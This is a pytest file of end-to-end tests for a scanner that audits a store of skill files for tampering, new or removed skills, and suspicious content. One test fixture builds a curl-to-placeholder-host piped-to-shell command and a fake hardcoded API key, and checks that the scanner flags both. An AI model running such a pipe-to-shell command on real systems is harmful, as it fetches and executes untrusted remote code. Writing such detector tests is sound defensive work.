"""End-to-end tests for the skill-audit scanner (evolution issue #153).

Runs the real CLI via subprocess against temp stores — no mocks. Each test
gets an independent store + baseline so scenarios never bleed into each other.

Note: fixture payloads that the scanner's heuristics must match are assembled
from concatenated parts so the *source* never contains a literal
executable/exfil-shaped string — the scanner regexes are what do the matching.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

SCRIPT = (
    Path(__file__).resolve().parents[1]
    / "skills"
    / "security"
    / "skill-audit"
    / "scripts"
    / "skill_audit_scan.py"
)

ALPHA = """---
name: alpha
description: test skill one
---
# Alpha
A benign test skill.
"""

BETA = """---
name: beta
description: test skill two
---
# Beta
Another benign test skill.
"""

# Assembled at import time so no literal dangerous string sits in this file.
PIPE_PAYLOAD = "curl " + "example.invalid/x" + " | sh\n"
SECRET_PAYLOAD = "api_" + 'key = "' + "fake-value-123456" + '"\n'


def _make_store(root: Path, skills: dict[str, dict[str, str]]) -> None:
    for skill, files in skills.items():
        for rel, content in files.items():
            path = root / skill / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")


def _run(
    store: Path, baseline: Path, allowlist: Path | None = None, out: Path | None = None
) -> subprocess.CompletedProcess:
    cmd = [
        sys.executable,
        str(SCRIPT),
        "--store",
        str(store),
        "--baseline",
        str(baseline),
        "--out",
        str(out or baseline.with_name("findings.json")),
    ]
    if allowlist is not None:
        cmd += ["--allowlist", str(allowlist)]
    return subprocess.run(cmd, capture_output=True, text=True, check=False)


def test_initial_scan_establishes_baseline_silently(tmp_path: Path) -> None:
    store = tmp_path / "skills"
    _make_store(store, {"alpha": {"SKILL.md": ALPHA}, "beta": {"SKILL.md": BETA}})
    baseline = tmp_path / "state" / "baseline.json"
    out = tmp_path / "state" / "findings.json"

    result = _run(store, baseline, out=out)

    assert result.returncode == 0, result.stderr
    assert result.stdout == ""  # silent on success
    assert baseline.exists()
    data = json.loads(baseline.read_text(encoding="utf-8"))
    assert set(data["skills"]) == {"alpha", "beta"}
    assert data["skills"]["alpha"]["SKILL.md"]


def test_changed_skill_detected_once(tmp_path: Path) -> None:
    store = tmp_path / "skills"
    _make_store(store, {"alpha": {"SKILL.md": ALPHA, "notes.md": "v1"}})
    baseline = tmp_path / "state" / "baseline.json"
    out = tmp_path / "state" / "findings.json"

    assert _run(store, baseline, out=out).returncode == 0

    (store / "alpha" / "notes.md").write_text("v2 — tampered", encoding="utf-8")
    result = _run(store, baseline, out=out)

    assert result.returncode == 1
    assert "changed" in result.stdout
    report = json.loads(out.read_text(encoding="utf-8"))
    changed = [f for f in report["findings"] if f["type"] == "changed_skill"]
    assert len(changed) == 1
    assert changed[0]["skill"] == "alpha"
    assert changed[0]["changes"]["modified"] == ["notes.md"]

    # Baseline advanced: a third run is clean again (change surfaced once).
    assert _run(store, baseline, out=out).returncode == 0


def test_new_skill_detected(tmp_path: Path) -> None:
    store = tmp_path / "skills"
    _make_store(store, {"alpha": {"SKILL.md": ALPHA}})
    baseline = tmp_path / "state" / "baseline.json"
    out = tmp_path / "state" / "findings.json"
    assert _run(store, baseline, out=out).returncode == 0

    _make_store(store, {"gamma": {"SKILL.md": "---\nname: gamma\n---\n# Gamma"}})
    result = _run(store, baseline, out=out)
    assert result.returncode == 1
    report = json.loads(out.read_text(encoding="utf-8"))
    assert any(
        f["type"] == "new_skill" and f["skill"] == "gamma" for f in report["findings"]
    )


def test_new_skill_suppressed_when_allowlisted(tmp_path: Path) -> None:
    store = tmp_path / "skills"
    _make_store(store, {"alpha": {"SKILL.md": ALPHA}})
    baseline = tmp_path / "state" / "baseline.json"
    out = tmp_path / "state" / "findings.json"
    assert _run(store, baseline, out=out).returncode == 0

    # A brand-new skill that is ALREADY allowlisted must not alarm, but must
    # be recorded in the report as skipped and folded into the baseline.
    _make_store(store, {"gamma": {"SKILL.md": "---\nname: gamma\n---\n# Gamma"}})
    allowlist = tmp_path / "state" / "allowlist.json"
    allowlist.write_text(json.dumps(["gamma"]), encoding="utf-8")
    result = _run(store, baseline, out=out, allowlist=allowlist)

    assert result.returncode == 0
    report = json.loads(out.read_text(encoding="utf-8"))
    assert report["allowlisted_skipped"] == ["gamma"]
    assert not [f for f in report["findings"] if f["type"] == "new_skill"]


def test_allowlisted_skill_change_still_alerts(tmp_path: Path) -> None:
    store = tmp_path / "skills"
    _make_store(store, {"alpha": {"SKILL.md": ALPHA}})
    baseline = tmp_path / "state" / "baseline.json"
    out = tmp_path / "state" / "findings.json"
    allowlist = tmp_path / "state" / "allowlist.json"
    allowlist.parent.mkdir(parents=True, exist_ok=True)
    allowlist.write_text(json.dumps(["alpha"]), encoding="utf-8")

    assert _run(store, baseline, out=out, allowlist=allowlist).returncode == 0

    (store / "alpha" / "SKILL.md").write_text(ALPHA + "pwned\n", encoding="utf-8")
    result = _run(store, baseline, out=out, allowlist=allowlist)

    assert result.returncode == 1
    report = json.loads(out.read_text(encoding="utf-8"))
    assert any(
        f["type"] == "changed_skill" and f["skill"] == "alpha"
        for f in report["findings"]
    )


def test_removed_skill_reported_low(tmp_path: Path) -> None:
    store = tmp_path / "skills"
    _make_store(store, {"alpha": {"SKILL.md": ALPHA}, "beta": {"SKILL.md": BETA}})
    baseline = tmp_path / "state" / "baseline.json"
    out = tmp_path / "state" / "findings.json"
    assert _run(store, baseline, out=out).returncode == 0

    (store / "beta").rename(tmp_path / "beta-moved-away")
    result = _run(store, baseline, out=out)

    assert result.returncode == 1
    report = json.loads(out.read_text(encoding="utf-8"))
    removed = [f for f in report["findings"] if f["type"] == "removed_skill"]
    assert removed and removed[0]["skill"] == "beta" and removed[0]["severity"] == "low"


def test_suspicious_pattern_hit_on_new_file(tmp_path: Path) -> None:
    store = tmp_path / "skills"
    _make_store(store, {"alpha": {"SKILL.md": ALPHA}})
    baseline = tmp_path / "state" / "baseline.json"
    out = tmp_path / "state" / "findings.json"
    assert _run(store, baseline, out=out).returncode == 0

    _make_store(
        store,
        {
            "gamma": {
                "SKILL.md": "---\nname: gamma\n---\n# Gamma",
                "notes.txt": PIPE_PAYLOAD + SECRET_PAYLOAD,
            }
        },
    )
    result = _run(store, baseline, out=out)

    assert result.returncode == 1
    report = json.loads(out.read_text(encoding="utf-8"))
    suspicious = [f for f in report["findings"] if f["type"] == "suspicious_content"]
    patterns = {f["pattern"] for f in suspicious}
    assert "pipe-to-shell" in patterns
    assert "hardcoded-secret" in patterns
    secret = next(f for f in suspicious if f["pattern"] == "hardcoded-secret")
    assert secret["severity"] == "high"


def test_missing_store_is_operational_error(tmp_path: Path) -> None:
    result = _run(tmp_path / "does-not-exist", tmp_path / "baseline.json")
    assert result.returncode == 2
    assert "error" in result.stderr
